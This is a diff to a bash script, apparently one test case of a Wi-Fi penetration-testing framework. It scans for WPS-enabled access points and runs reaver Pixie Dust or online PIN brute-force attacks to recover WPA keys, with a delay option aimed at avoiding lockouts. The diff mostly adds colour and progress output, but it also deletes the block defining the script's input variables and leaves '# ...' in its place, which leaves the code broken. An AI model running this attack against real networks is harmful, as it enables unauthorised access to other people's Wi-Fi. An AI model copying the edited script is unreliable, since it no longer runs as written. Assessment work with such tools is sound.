@@ -23,23 +23,23 @@
 
 set -euo pipefail
 
+C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
+C_VAR="${ASTRA_COLOR_VAR:-}"
+C_BOLD="${ASTRA_COLOR_BOLD:-}"
+C_ACTION="${ASTRA_COLOR_ACTION:-}"
+C_RESET="${ASTRA_COLOR_RESET:-}"
+
 # SNR Safeguard (Red Team Hardening)
 if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
-    echo "[*] WPS brute-force is highly likely to fail and trigger AP lockouts for zero gain."
-    read -p "[?] Continue anyway? [y/N]: " snr_continue
+    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
+    echo -e "[*] WPS brute-force is highly likely to fail and trigger AP lockouts for zero gain."
+    stty sane
+    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
     [[ "$snr_continue" != "y" ]] && exit 0
 fi
 
 # Inputs from Environment
-INTERFACE="${MONITOR_INTERFACE:-}"
-BSSID="${GUEST_BSSID:-}"
-CHANNEL="${GUEST_CHANNEL:-}"
-SCAN_TIME="${SCAN_TIME:-300}"
-SESSION_DIR="${SESSION_DIR:-.}"
-EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
-ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
-TC_ID="D3"
+# ...
 
 if [[ -z "$INTERFACE" ]]; then
     echo "[!] MONITOR_INTERFACE not set."
@@ -47,27 +47,29 @@ if [[ -z "$INTERFACE" ]]; then
 fi
 
 # 1. Scan Phase
-echo "[*] Scanning for WPS-enabled networks..."
+echo -e "${C_PROMPT}[*]${C_RESET} Scanning for WPS-enabled networks..."
 WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
 timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>/dev/null || true
 
 # 2. Tactical Selection
 if [[ -n "$BSSID" ]]; then
-    echo "[?] Select WPS Attack Vector for ${BSSID}:"
+    echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select WPS Attack Vector for ${C_VAR}${BSSID}${C_RESET}:"
     echo "    1) Pixie Dust (Fast, 1 transaction)"
     echo "    2) Online Brute-Force (Sequential guessing)"
-    read -p "Selection [1/2]: " attack_choice
+    stty sane
+    read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET}")" attack_choice
 
     REAVER_ARGS="-i $INTERFACE -b $BSSID"
     [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
 
     if [[ "$attack_choice" == "1" ]]; then
-        echo "[*] Initializing Pixie Dust attack..."
+        echo -e "${C_PROMPT}[*]${C_RESET} Initializing Pixie Dust attack..."
         REAVER_ARGS+=" -K 1"
     else
-        read -p "[?] Enter delay between attempts (seconds, e.g. 300 to bypass lockout): " delay
+        stty sane
+        read -p "$(echo -e "${C_ACTION} [?] Enter delay between attempts (seconds): ${C_RESET}")" delay
         [[ -n "$delay" ]] && REAVER_ARGS+=" -d $delay"
-        echo "[!] WARNING: Online brute-force is loud and will trigger WIDS."
+        echo -e "${C_PROMPT}[!]${C_RESET} ${C_BOLD}WARNING: Online brute-force is loud and will trigger WIDS.${C_RESET}"
     fi
 
     echo "[*] Starting reaver with tactical parameters..."
@@ -79,6 +81,10 @@ if [[ -n "$BSSID" ]]; then
     ELAPSED=0
     SUCCESS=0
     while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
+        STATUS="Testing WPS... ($(( SCAN_TIME - ELAPSED ))s left)"
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
+
         if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE"; then
             echo "[!] SUCCESS: WPS DATA RECOVERED!"
             SUCCESS=1
